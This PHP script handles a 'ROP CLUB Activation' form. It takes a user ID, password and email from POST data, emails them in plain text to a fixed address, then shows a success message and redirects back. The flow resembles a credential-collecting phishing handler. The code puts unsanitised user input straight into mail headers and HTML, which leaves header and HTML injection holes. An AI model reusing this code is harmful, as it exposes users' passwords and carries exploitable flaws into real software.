<?php
$ropid=$_POST['ropid'];
$pass=$_POST['pass'];
$email=$_POST['email'];
$qtype="ROP CLUB Activation";

ini_set("SMTP","xmail.asianetindia.com");
ini_set("smtp_port","25");
ini_set("sendmail_from","someone@example.com");

$http_referrer = getenv( "HTTP_REFERER" );
$to      = 'someone@example.com'.',';
$mailto  = 'someone@example.com'.',';
$subject = $qtype;
			$headers = "From: " . $name ." (Website)". "<" . $email . ">\n";
			$headers .= "User-Agent: Mail/1.0.0\n";
			$headers .= "MIME-Version: 1.0\n";
			$headers .= "X-Sender: <" . "$mailto" . ">\n";
			$headers .= "Return-Path: <" . "$mailto" . ">\n";
			$headers .= "Error-To: <" . "$mailto" . ">\n";
			$headers .= "Content-Type: text/html;charset=utf-8\n";
			$headers .= "Content-Transfer-Encoding: 8bit\n";
			$headers .= "X-Priority: 3 (Normal)\n";
			$headers .= "Importance: Normal\n";

$mesfrmt="<table width='99%' border='0' cellspacing='0' cellpadding='4'>
<tr>
    <td colspan='3' align='center' valign='middle' bgcolor='#FF99FF'>CONGRATULATIONS</td>
  </tr>
  <tr>
    <td colspan='3' align='left' valign='top'><div align='justify' style='margin:10px;'>You </div></td>
  </tr>
  <tr>
    <td colspan='3' align='center' valign='middle' bgcolor='#FF99FF'>-------------------- Mail From : <font color='#222d45'>www.ropclub.com</font> --------------------</td>
  </tr>
  <tr>
    <td align='left' valign='top'>ROC ID</td>
    <td align='left' valign='top'>:</td>
    <td align='left' valign='top'>$ropid</td>
  </tr>
  <tr>
    <td align='left' valign='top'>Password</td>
    <td align='left' valign='top'>&nbsp;</td>
    <td align='left' valign='top'>$pass</td>
  </tr>
  <tr>
    <td width='25%' align='left' valign='top'>E-mail</td>
    <td width='2%' align='left' valign='top'>:</td>
    <td align='left' valign='top'><a href='mailto:$email'>$email</a></td>
  </tr>

  <tr>
    <td height='5' colspan='3' align='left' valign='top' bgcolor='#990000'></td>
  </tr>
</table>

";

mail($to, $qtype, $mesfrmt, $headers);

echo "<html><head><title>ROP Club :: Success</title><script>function update(){history.back(1);}var refresh=setInterval('update()',3000);</script></head><body onload=refresh><div align=center><center>
      <table border=1pt cellpadding=0 cellspacing=0 border-collapse: collapse; bordercolor=#111111 bgcolor=#ced979><tr><td>
        <table border=0 cellpadding=3 cellspacing=0 border-collapse: collapse; bordercolor=#111111><tr><td><b><font color=#FF0000><font face=verdana size=2>Success: Login Details send !!</font></font></b></td></tr></table></td></tr></table></center></div><p align=center><font face=Verdana size=1 color=#666666>Please wait for a while... You are being redirected! If not then click </font><a href=javascript: text-decoration: none><font face=Verdana size=1 color=#3399FF>here</font></a><font face=Verdana size=1 color=#666666>.</font></p><body></html>";
		?>
